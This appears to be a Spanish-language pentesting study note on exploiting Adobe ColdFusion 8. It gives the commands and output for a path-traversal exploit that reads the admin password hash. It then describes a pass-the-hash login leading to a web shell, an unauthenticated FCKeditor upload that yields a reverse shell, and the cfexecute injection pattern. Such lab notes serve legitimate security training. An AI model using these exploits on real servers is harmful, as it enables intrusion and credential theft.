---
tags:
  - Web/Red-Team
  - ColdFusion
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-16
Nota previa: "[[00 - Descubrimiento y enumeración de ColdFusion]]"
Nota siguiente: "[[IIS Tilde Enumeration]]"
Area: "[[Common Applications.base|Common Applications]]"
---
---

Fijada la versión ([[00 - Descubrimiento y enumeración de ColdFusion|ColdFusion 8]] en el ejemplo), el primer paso es `searchsploit adobe coldfusion` para cruzar versión ↔ exploit. Para CF8, dos joyas: **directory traversal** (CVE-2010-2861) y **RCE no autenticada** (CVE-2009-2265).

# CVE-2010-2861 — Directory Traversal → hash del admin

El parámetro `locale` de varios ficheros del panel (`CFIDE/administrator/settings/mappings.cfm`, `enter.cfm`, `logging/settings.cfm`…) es vulnerable a *path traversal*. El objetivo es <mark style="background: #FF5582A6;">`password.properties`, que guarda el hash de la contraseña del administrador</mark> (en `[cf_root]/lib`):

```shell-session
$ searchsploit -p 14641 ; cp .../14641.py .
$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
...
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
```

El login del panel hashea la contraseña en cliente → con el hash se hace *pass-the-hash* para entrar, y desde el admin se despliega un componente CFM con web shell.

# CVE-2009-2265 — RCE no autenticada (FCKeditor)

El **FCKeditor** incluido permite subir ficheros sin autenticación → subir un `.jsp`/`.cfm` y ejecutar:

```text
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

El exploit `50057.py` (editando `lhost/lport/rhost/rport`) sube el payload y devuelve un reverse shell (a menudo como usuario de ColdFusion, muy privilegiado):

```shell-session
$ searchsploit -p 50057 ; cp .../50057.py .
$ python3 50057.py        # → uploads .jsp → nc shell en C:\ColdFusion8\...
```

> [!warning]+ El patrón `cfexecute`
> Muchas RCE de ColdFusion nacen de código como `<cfexecute name="cmd.exe" arguments="/c #cgi.query_string#">` con entrada sin validar → basta pasar el comando en la query string (URL-encoded).

> [!info]+ Modernización: la CVE de 2023
> Lo anterior es CF8 (viejo). En despliegues actuales, la crítica es <mark style="background: #FF5582A6;">**CVE-2023-26360** (y CVE-2023-29300): RCE **no autenticada** por deserialización (WDDX)</mark> en CF 2018/2021, explotada activamente ([CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)); y **CVE-2024-20767** (lectura de ficheros). Herramientas: `searchsploit`, `nuclei -tags coldfusion`, módulos `exploit/multi/http/coldfusion_*` de Metasploit.

Siguiente, una técnica de enumeración específica de IIS: [[IIS Tilde Enumeration]].
